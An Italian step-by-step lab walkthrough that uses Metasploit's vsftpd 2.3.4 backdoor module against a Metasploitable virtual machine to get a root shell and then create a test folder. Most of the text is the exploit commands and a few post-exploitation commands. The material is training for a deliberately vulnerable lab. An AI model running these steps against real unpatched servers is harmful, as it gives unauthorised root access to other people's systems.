1. Avvio di Metasploit
Sul tuo Kali Linux (o macchina attaccante), apri il terminale e avvia la console:
msfconsole
2. Ricerca del modulo di exploit
Una volta dentro msf6 >, cerca l'exploit per vsftpd:
search vsftpd
Dovresti vedere qualcosa come:
textexploit/unix/ftp/vsftpd_234_backdoor
3. Carica il modulo e configura
use exploit/unix/ftp/vsftpd_234_backdoor
Imposta l'indirizzo IP della vittima:
set RHOSTS 192.168.1.149
(Opzionale, ma utile) Verifica le opzioni:
show options
4. Esegui l'exploit
run
oppure semplicemente
exploit
L'exploit sfrutta la backdoor presente in vsftpd 2.3.4 (il famoso :) ). Se ha successo, dovresti ottenere immediatamente una shell root sulla macchina Metasploitable.
5. Crea la cartella richiesta
Una volta dentro la shell (prompt root@metasploitable:...# o simile), esegui:
cd /
mkdir test_metasploit
Verifica che sia stata creata:
ls -la /
Dovresti vedere la cartella test_metasploit.
Comandi utili aggiuntivi (post-sfruttamento)

Vedere dove sei: pwd
Chi sei: whoami (dovrebbe essere root)
Uscire dalla shell: exit o Ctrl+C (a seconda del tipo di sessione)